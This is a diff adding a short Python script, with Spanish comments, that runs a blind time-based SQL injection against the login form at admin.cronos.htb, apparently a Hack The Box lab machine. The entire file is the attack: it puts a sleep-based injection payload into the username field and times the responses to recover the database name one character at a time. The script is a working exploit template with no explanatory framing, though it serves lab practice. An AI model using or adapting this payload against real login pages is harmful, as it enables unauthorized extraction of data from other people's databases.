@@ -1,0 +1,55 @@
+#!/usr/bin/python3
+ 
+from pwn import *
+import requests
+import time, string, pdb, signal
+
+
+def def_handler(sig, frame):
+    print("\nSaliendo\n")
+    sys.exit(1)
+ 
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+ 
+# Variables Globales
+url = "admin.cronos.htb"
+characters = string.ascii_lowercase
+ 
+def makeRequest():
+    p1 = log.progress("SQLI")
+    p1.status("Fuerza Bruta")
+    
+    p2 = log.progress("database")
+ 
+    time.sleep(2)
+ 
+    database = ""
+ 
+    for position in range(1, 11):
+        for character in characters:
+            
+            post_data = {
+                'username': "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
+                'password': 'admin'
+            }
+ 
+            p1.status(post_data['username'])
+
+
+          #  time.sleep(1)
+ 
+            time_start = time.time()
+            r = requests.post(url, data=post_data)
+            time_end = time.time()
+ 
+            if time_end - time_start > 5:
+                
+                database += character
+                p2.status(database)
+                break
+ 
+ 
+if __name__ == '__main__':
+   
+    makeRequest()
